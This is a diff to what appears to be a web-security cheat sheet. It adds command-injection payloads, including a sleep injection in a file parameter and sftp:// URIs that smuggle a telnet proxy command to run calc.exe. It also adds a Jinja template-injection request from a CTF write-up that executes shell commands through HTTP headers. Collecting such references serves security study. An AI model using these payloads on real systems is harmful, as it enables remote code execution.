@@ -239,7 +239,12 @@ Clone:
 
 - URL parameter
     - `file="'$(sleep 5)'a.gif`
-
+- URL handlers
+    - executable (`.desktop`, `.jar`, `.exe`...) on file share (`file:///var/run/user/<id>/gvfs/...`, `nfs://`, `webdav://`, `smb://`...)
+    - `sftp://nextclouduser@<server>/example.desktop`
+    - `sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/`
+        - [#1078002 Nextcloud Desktop Client RCE via malicious URI schemes](https://hackerone.com/reports/1078002)
+        - [Allow arbitrary URLs, expect arbitrary code execution \| Positive Security](https://positive.security/blog/url-open-rce)
 - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
 - [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
     - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
@@ -247,7 +252,12 @@ Clone:
 ### server-side template injection (SSTI)
 
 - jinja
-    ```html
+    - [CTFtime\.org / zer0pts CTF 2020 / notepad / Writeup](https://ctftime.org/writeup/18597)
+    ```
+    GET /ttttt?cmd=cat%20flag HTTP/1.1
+    Host: {{url_for.__globals__.os.popen(request.args.cmd).read()}}
+    Referer: http://{{url_for.__globals__.os.popen(request.args.cmd).read()}}/
+
     {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 
     <script>
